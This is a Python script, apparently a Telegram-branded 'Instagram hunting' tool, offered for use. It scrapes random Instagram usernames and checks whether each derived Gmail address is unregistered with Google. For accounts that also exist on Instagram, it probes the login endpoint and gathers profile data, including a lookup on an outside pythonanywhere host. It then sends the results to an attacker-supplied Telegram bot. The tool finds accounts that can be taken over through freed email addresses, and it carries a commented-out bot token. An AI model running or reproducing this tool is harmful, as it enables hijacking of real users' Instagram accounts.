try:
	import requests,os,names,random,time,mechanize,sys
	from user_agent import generate_user_agent
	from uuid import uuid4
except:
	os.system("pip install requsets")
	os.system("pip install names")
	os.system("pip install user_agent")
	os.system("pip install uid")
	os.system("pip install uuid")
	os.system("clear")
import requests,os,names,json,random
import requests,os,names,random,time
import webbrowser
from pyfiglet import figlet_format
from user_agent import generate_user_agent
from uuid import uuid4
uid = uuid4()
import requests,random,mechanize,time
import requests,random,mechanize,datetime
r = requests.session()
now = datetime.datetime.today()

now = datetime.datetime.today()
mm = str(now.month)
dd = str(now.day)
yyyy = str(now.year)
hour = str(now.hour)
mi = str(now.minute)
ss = str(now.second)
t=(mm + "/" + dd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss)


hours = (now.hour)
x = datetime.datetime.now()
g= datetime.datetime(2022, 8, 29, 20, 00 ,0)

if (x.strftime("%x"))>(g.strftime("%x")):
 print('\n\n')
 print("     "+' لتجديد الاشتراك راسل المطور @P_0_T - @Steftools')
 print('\n\n')
 print(x)
 
 sys.exit(0)
 

if (x.strftime("%x"))==(g.strftime("%x")):
   print('')
   if(x.strftime("%X"))>(g.strftime("%X")):
    print('\n\n')
    print("     "+' ')
    print('\n\n')
    print(x)
    
    sys.exit(0)
   else:
    print('')  
else:
    print('')
print('')


os.system('clear')
#------------------------------[الالوان]------------------------------
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
M = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
E = '\033[1;31m' #احمر
F = "\033[1;97m" #ابيض
A = "\033[1;91m"
D = "\033[1;97m"
E = "\033[1;92m"
H = "\033[1;93m"
K = "\033[1;94m"
L = "\033[1;95m"
#------------------------------[STEF]------------------------------

webbrowser.open('https://t.me/StefTools')

mn=0
print(F+'━'*60)
AT=f""" 
                    {Z}< {F}HITT INSTA BY Simo{Z}>    
     {C} ╔{Z}══════════{C}═════════════════════{Z}═════════{C}╗
      {Z}║{A}({E}⌯{A}) {C} programier{A}    : {C}Stef Tools{Z}         ║
      {C}║{A}({E}⌯{A})  {C}Telegram{A}   : {C}https://t.me/StefTools{C}║
      {C}║{A}({E}⌯{A})  {C}YOUTUBE{A}     : {C}TOOLS STEF{C}           ║
      {A}║{A}({E}⌯{A})  {C}GITHUB {Z}       : {C}GITHUB.COM/Stef   {A} ║
      {C}╚{Z}══════════{C}══════════════════════{Z}════════{C}╝
"""
print(AT)
print(F+'━'*60)
print()
#token = "5460384810:AAHgMt4kmmZaBMn_8DYmtvv2PBpcGVFe-No"
#ID = "5000568348"
sid = input(f'{Z} ({M}⌯{Z}) {B} 𝙎𝙀𝙎𝙎𝙄𝙊𝙉 𝙄𝘿  ➪ '+ M)

print(M+'━━━━━━━━━━━━━━━━━━')
token = input(f'{Z} ({M}⌯{Z}) {B}𝙏𝙊𝙆𝙀𝙉 ➪  ' + M)
print(M+'━━━━━━━━━━━━━━━━━━')
ID = input(f'{Z} ({M}⌯{Z}) {B}𝙄𝘿 ➪ ' + M)
print(M+'━━━━━━━━━━━━━━━━━━')

head={'Cookie':'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid='+sid}
def check(email,user):
 user=str(user)
 email=str(email)
 url='https://i.instagram.com/api/v1/accounts/login/'
 headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',
                 'Cookie':'missing',
                 'Accept-Encoding':'gzip, deflate',
                 'Accept-Language':'en-US',
                 'X-IG-Capabilities':'3brTvw==',
                 'X-IG-Connection-Type':'WIFI',
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
              'Host':'i.instagram.com'}
 data = {'uuid':uid,  'password':'@whisper666',
              'username':email,
              'device_id':uid,
              'from_reg':'false',
              '_csrftoken':'missing',
              'login_attempt_countn':'0'}
 req= requests.post(url, headers=headers, data=data).json()
 if req['message'] == 'The password you entered is incorrect. Please try again.':
	 rr=requests.get(f'https://www.instagram.com/{user}/?__a=1&__d=dis',headers=head).json()  
	 nam = str(rr['graphql']['user']['full_name'])
	 iddd = str(rr['graphql']['user']['id'])
	 fol = str(rr['graphql']['user']['edge_followed_by']['count'])
	 fols =str(rr['graphql']['user']['edge_follow']['count'])
	 isp = str(rr['graphql']['user']['is_private'])
	 bio = str(rr['graphql']['user']['edge_owner_to_timeline_media']['count'])
	 re = requests.get(f"https://o7aa.pythonanywhere.com/?id={iddd}")   
	 ree = re.json()
	 dat = ree['data']
	 tlg =(f"""
☕︎𝑵𝒆𝒘𝑯𝒖𝒏𝒕𝒊𝒏 ☕︎
⋘─────━𓆩𝙎𝙏𝙀𝙁𓆪‏━─────⋙
𝙉𝙖𝙢𝙚 ➪ {nam}
𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚 ➪ {user}
𝙀𝙢𝙖𝙞𝙡 ➪ {email}
𝙁𝙤𝙡𝙡𝙤𝙬𝙖𝙧𝙨 ➪ {fol}
𝙁𝙤𝙡𝙡𝙤𝙬𝙞𝙣𝙜 ➪ {fols}
𝘿𝙖𝙩𝙖 ➪ {dat}
𝙋𝙤𝙨𝙩 ➪ {bio}
𝙇𝙞𝙣𝙠 ➪ https://www.instagram.com/{user}
⋘─────━𓆩𝙎𝙏𝙀𝙁𓆪‏━─────⋙
𝘉𝘠 ➪ @StefTools - @P_0_T """)
	 print(M+tlg)
	 print(f'{E}====================================')
	 requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(tlg))
 if req['message'] == "The username you entered doesn't appear to belong to an account. Please check your username and try again.":
	 print(f'{Z} ● BaD Instgram «--» {email}')
	 
def yahoo(email,user):
	eml=str(email)
	email=eml.split('@')[0]+'@gmail.com'
	url = 'https://android.clients.google.com/setup/checkavail'
	h = {
		'Content-Length':'98',
		'Content-Type':'text/plain; charset=UTF-8',
		'Host':'android.clients.google.com',
		'Connection':'Keep-Alive',
		'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',
		}
	d = json.dumps({
		'username':email,
		'version':'3',
		'firstName':'AbaLahb',
		'lastName':'AbuJahl'
	})
	res = requests.post(url,data=d,headers=h)
	if res.json()['status'] == 'SUCCESS':
	    check(email,user)
	else:
	    print (f'{B} ● Bad gmail «--» '+email)
def users():
 while True:
#  mal=['male','femal']
#  gen=random.choice(mal)
  user='1234567890qwertyuiopasdfghjklzxcvbnm.'
  num='56789'
  rng=int("".join(random.choice(num)for i in range(1)))
  name=str("".join(random.choice(user)for i in range(rng)))
  whisper=requests.get(f'https://www.instagram.com/web/search/topsearch/?context=blended&query={name}',headers=head).json()
  mn=0
  try:
   while True:
    mn += 1
    user=str(whisper['users'][mn]['user']['username'])
    emai=user
    email=emai+'@gmail.com'
    yahoo(email,user)
  except IndexError:
   users()
users()